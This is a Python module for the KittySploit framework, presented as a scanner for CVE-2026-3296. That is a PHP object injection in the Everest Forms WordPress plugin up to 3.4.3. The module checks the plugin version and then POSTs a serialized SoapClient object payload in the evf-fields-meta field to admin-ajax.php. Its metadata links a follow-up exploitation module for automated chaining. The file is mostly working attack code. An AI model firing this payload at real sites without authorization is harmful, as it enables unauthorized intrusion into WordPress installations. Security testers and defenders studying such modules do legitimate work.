#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Everest Forms <= 3.4.3 PHP object injection (CVE-2026-3296)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "everest-forms"
_VULN_HIGH = (3, 4, 3)
_SOAP_POC = (
    'O:10:"SoapClient":4:{s:3:"uri";s:4:"http";s:8:"location";s:4:"http";'
    's:15:"_soap_version";i:1;s:13:"_proxy_host";N;}'
)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Everest Forms CVE-2026-3296 detect",
        "description": (
            "Detects vulnerable Everest Forms and accepts evf-fields-meta serialized POST."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-3296",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-3296"],
        "modules": ["auxiliary/admin/http/everest_forms_cve_2026_3296_poi_submit"],
        "tags": ["web", "scanner", "wordpress", "everest-forms", "poi", "cve-2026-3296"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/everest_forms_cve_2026_3296_poi_submit"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "evf_submit_form",
                "evf_id": "1",
                "evf-field-1": "test",
                "evf-fields-meta": _SOAP_POC,
            },
            allow_redirects=False,
        )
        if resp and int(resp.status_code or 0) in (200, 302, 400, 500):
            self.set_info(
                severity="critical",
                reason="Everest Forms stores attacker-controlled serialized meta",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2026-3296",
            )
            return True
        return False
